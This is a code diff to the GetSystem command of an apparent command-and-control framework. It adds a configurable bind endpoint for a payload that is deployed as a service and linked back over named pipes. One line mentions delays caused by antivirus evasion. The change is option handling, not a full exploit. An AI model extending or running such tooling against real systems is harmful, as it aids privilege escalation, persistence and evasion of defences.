@@ -17,6 +17,7 @@ namespace Commander.Commands.Composite
 {
     public class GetSystemCommandOptions
     {
+        public string endpoint { get; set; }
         public bool verbose { get; set; }
         public string pipe { get; set; }
         public string file { get; set; }
@@ -41,6 +42,7 @@ namespace Commander.Commands.Composite
         public override RootCommand Command => new RootCommand(this.Description)
         {
              new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
+             new Option<string>(new[] { "--endpoint", "-b" }, () => null, "EndPoint to Bind To"),
              new Option<string>(new[] { "--pipe", "-n" }, () => "localsys","Name of the pipe used to pivot."),
              new Option<string>(new[] { "--file", "-f" }, () => null,"Name of payload."),
              new Option<string>(new[] { "--service", "-s" }, () => "syssvc","Name of service."),
@@ -59,7 +61,18 @@ namespace Commander.Commands.Composite
                 return;
             }
 
-            var endpoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
+            if (string.IsNullOrEmpty(options.endpoint))
+            {
+                options.endpoint = $"pipe://127.0.0.1:{options.pipe}";
+                commander.WriteLine($"No Endpoint selected, taking the current agent enpoint ({options.endpoint})");
+            }
+
+            var endpoint = ConnexionUrl.FromString(options.endpoint);
+            if (!endpoint.IsValid)
+            {
+                commander.WriteError($"[X] EndPoint is not valid !");
+                return;
+            }
 
             var payloadOptions = new PayloadGenerationOptions()
             {
@@ -119,9 +132,12 @@ namespace Commander.Commands.Composite
             agent.Echo($"[*] Execution done!");
             agent.Echo(Environment.NewLine);
 
-            agent.Echo($"Linking to {endpoint}");
-            var targetEndPoint = ConnexionUrl.FromString($"rpipe://127.0.0.1:{options.pipe}");
-            agent.Link(targetEndPoint);
+            if (endpoint.Protocol == ConnexionType.NamedPipe)
+            {
+                agent.Echo($"Linking to {endpoint}");
+                var targetEndPoint = ConnexionUrl.FromString($"rpipe://127.0.0.1:{options.pipe}");
+                agent.Link(targetEndPoint);
+            }
 
             if (options.inject)
                 commander.WriteInfo($"Due to AV evasion, agent can take a couple of minutes to check-in...");
